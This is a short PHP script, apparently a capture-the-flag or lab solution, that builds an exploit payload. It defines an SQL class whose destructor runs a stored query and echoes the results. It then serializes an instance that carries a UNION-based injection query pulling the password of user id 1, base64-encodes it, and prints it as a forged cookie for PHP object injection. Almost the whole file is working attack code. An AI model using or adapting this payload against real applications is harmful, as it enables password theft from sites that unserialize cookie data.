<?php
phpinfo();
class SQL {
    public $query = '';
    public $conn;
    public function __construct() {
    }

    public function connect() {
        $this->conn = new SQLite3 ("database.db", SQLITE3_OPEN_READONLY);
    }

    public function SQL_query($query) {
        $this->query = $query;
    }

    public function execute() {
        return $this->conn->query ($this->query);
    }

    public function __destruct() {
        if (!isset ($this->conn)) {
            $this->connect ();
        }

        $ret = $this->execute ();
        if (false !== $ret) {
            while (false !== ($row = $ret->fetchArray (SQLITE3_ASSOC))) {
                echo '<p class="well"><strong>Username:<strong> ' . $row['username'] . '</p>';
            }
        }
    }
}



$sql = new SQL();
$sql->connect();
$sql->query = 'SELECT username FROM users WHERE id=';

$sql2= new SQL();

$sql2->query= 'SELECT username from users where id =-1 UNION SELECT password from users where id=1 ';

$cookie = base64_encode (serialize ($sql2)) ;

echo $cookie;


?>
<html>
<body> Hello ! </body>
</html>


